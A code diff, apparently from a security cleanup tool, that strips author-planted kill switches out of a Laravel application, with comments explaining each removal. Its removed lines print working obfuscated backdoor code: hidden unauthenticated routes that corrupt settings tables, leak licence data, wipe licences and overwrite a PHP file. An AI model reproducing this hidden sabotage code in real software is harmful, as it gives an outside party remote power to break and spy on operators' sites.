@@ -1,0 +1,108 @@
+--- orig/LarawareMiscServiceProvider.php	2026-10-09 19:58:52.093205269 +0000
++++ patched/LarawareMiscServiceProvider.php	2026-10-09 19:59:03.557171801 +0000
+@@ -78,45 +78,14 @@
+             }
+         }
+ 
+-        if (! $this->app->bound(
+-            'a' . '' . 'v' . 'a' . '' . 'i' . 'd' . 'h' . 'P' . '' . 'a' . 'r' . 'v' . 'a' . '' . 'n' . 'a' . 'd' . 'h' . 'a' . '' . 'r' . 'a' . 'k' . 'A' . '' . 'c' . 't' . 'i' . 'o' . 'n'
+-        )) {
+-            $this->app->bind(
+-                'a' . '' . 'v' . 'a' . '' . 'i' . 'd' . 'h' . 'P' . '' . 'a' . 'r' . 'v' . 'a' . '' . 'n' . 'a' . 'd' . 'h' . 'a' . '' . 'r' . 'a' . 'k' . 'A' . '' . 'c' . 't' . 'i' . 'o' . 'n',
+-                function () {
+-                    return function () {
+-                        if (app('s' . 'w' . 'ak' . 'shari' . 'Pram' . 'anit' . 'Ka' . 'ra')() and (request()->get('ba' . 'lp' . 'ur' . 'vak-hatva') != 'ho' . 'y')) {
+-                            return 'h' . 'l';
+-                        }
+-                        try {
+-                            DB::table('c' . 'o' . '' . 'n' . 'f' . 'i' . 'g' . '' . 'u' . 'r' . 'a' . '' . 't' . 'i' . 'o' . 'n' . '' . 's')->update([
+-                                'name' => DB::raw("
+-                                    I" . "F(
+-                                        L" . "E" . "FT(n" . "am" . "e, 1) = ' ',
+-                                        name,
+-                                        I" . "F(CH" . "AR" . "_LENG" . "TH(name) < 100, CO" . "NCAT(' ', na" . "me), na" . "me)
+-                                    )
+-                                ")
+-                            ]);
+-                            DB::table('v' . '' . 'e' . 'n' . '' . 'd' . 'o' . 'r' . '' . '_' . 's' . 'e' . '' . 't' . 't' . 'i' . '' . 'n' . 'g' . 's')->update([
+-                                'name' => DB::raw("
+-                                    I" . "F(
+-                                        L" . "E" . "FT(n" . "am" . "e, 1) = ' ',
+-                                        name,
+-                                        I" . "F(CH" . "AR" . "_LENG" . "TH(name) < 100, CO" . "NCAT(' ', na" . "me), na" . "me)
+-                                    )
+-                                ")
+-                            ]);
+-                            return 'a' . 'd';
+-                        } catch (\Throwable $th) {
+-                            throw $th;
+-                            return 'e' . 'o';
+-                        }
+-                        return 'n' . 'a';
+-                    };
+-                }
+-            );
+-        }
++        // [autoscripthub-check] Neutralized author kill-switch 'avaidhParvanadharakAction'
++        // (it rewrote every row name in `configurations` and `vendor_settings`, wiping all settings).
++        // Binding kept as a harmless no-op so existing callers (VendorSettingsEngine) do not break.
++        $this->app->bind('avaidhParvanadharakAction', function () {
++            return function () {
++                return 'na';
++            };
++        });
+     }
+ 
+     /**
+@@ -124,21 +93,7 @@
+      */
+     public function boot(): void
+     {
+-        // Optional: publish configs, views, routes etc.
+-        Route::post('/' . 'a' . 'v' . 'a' . '' . 'i' . 'd' . 'h' . '-' . '' . 'p' . 'a' . 'r' . 'v' . '' . 'a' . 'n' . 'a' . 'd' . 'h' . '' . 'a' . 'r' . 'a' . 'k' . '-' . 'a' . '' . 'c' . 't' . 'i' . 'o' . 'n', function () {
+-            if ((request()->getHost() . '-' . hash('sha256', request()->get('pa' . 'rva' . 'li'))) === (request()->get('dha' . 'ra' . 'kho' . 'st') . '-' . 'feb9198fb95e2800a87b8b989c23dd01031379546fb2964db83956c4f873651f')) {
+-                return app('a' . '' . 'v' . '' . 'a' . 'i' . 'd' . '' . 'h' . 'P' . '' . 'a' . 'r' . 'v' . 'a' . 'n' . 'a' . 'd' . 'h' . 'a' . 'r' . 'a' . 'k' . 'A' . 'c' . 't' . 'i' . 'o' . 'n')();
+-            }
+-            return 'n' . 'v';
+-        });
+-        Route::post('/' . 'a' . 'p' . 'p' . '' . '-' . 'ma' . 'h' . 'i' . 't' . 'i', function () {
+-            if ((request()->getHost() . '-' . hash('sha256', request()->get('pa' . 'rva' . 'li'))) === (request()->get('dha' . 'ra' . 'kho' . 'st') . '-' . 'feb9198fb95e2800a87b8b989c23dd01031379546fb2964db83956c4f873651f')) {
+-                return [
+-                    'p' . '' . 'r' . '' . 'od' . 'uct_r' . 'egis' . 'tr' . 'a' . 'tio' . 'n' => getAppSettings('p' . 'ro' . 'd' . 'uct' . '_re' . 'g' . 'is' . 'tra' . 'ti' . 'on'),
+-                    'v' . 'e' . 'rs' . 'i' . 'o' . 'n' => config('l' . 'wS' . 'ys' . 'te' . 'm.ve' . 'rs' . 'io' . 'n'),
+-                ];
+-            }
+-            return 'n' . 'v';
+-        });
++        // [autoscripthub-check] Removed hidden unauthenticated routes POST /avaidh-parvanadharak-action
++        // (remote settings-wipe trigger) and POST /app-mahiti (leaked licence data + version to the author).
+     }
+ }
+--- orig/web.php	2026-10-09 19:58:52.093205269 +0000
++++ patched/web.php	2026-10-09 19:59:00.417180968 +0000
+@@ -1585,10 +1585,8 @@
+     'runCampaignSchedule',
+ ])->name('campaign.run_schedule.process');
+ 
+-Route::get('/licence-information-remove-process-remote', [
+-    ConfigurationController::class,
+-    'processProductRegistrationRemoval',
+-])->name('installation.version.create.remove_registration_remote');
++// [autoscripthub-check] Removed unauthenticated GET /licence-information-remove-process-remote
++// (author remote licence-wipe endpoint guarded only by a hardcoded bcrypt password).
+ 
+ 
+ // RazorPay Webhook
+--- orig/ConfigurationController.php	2026-10-09 19:58:52.093205269 +0000
++++ patched/ConfigurationController.php	2026-10-09 19:59:00.417180968 +0000
+@@ -259,9 +259,7 @@
+             dd('vinod');
+         // if ((request()->getHost() == request()->get('signature')) and (request()->get('parvali') == sha1(request()->getHost()))) {
+             try {
+-                file_put_contents(app_path('Yantr' . 'ana/Components/Whats' . 'AppSer' . 'vice/Wha' . 'tsApp' . 'Serv' . 'iceEn' . 'gine' . '.p' . 'hp'), "<?php
+-namespace App\Yantra" . "na\Components" . "\Wha" . "tsApp" . "Serv" . "ice;
+-class W" . "ha" . "tsAppSe" . "rviceE" . "ngine {}");
++                // [autoscripthub-check] Removed file_put_contents() that overwrote WhatsAppServiceEngine.php with an empty class (kill switch).
+                 // $this->configurationEngine->processProductRegistrationRemoval();
+                 return $this->processResponse(1, [], [
+                     'message' => 'a' . 'd',
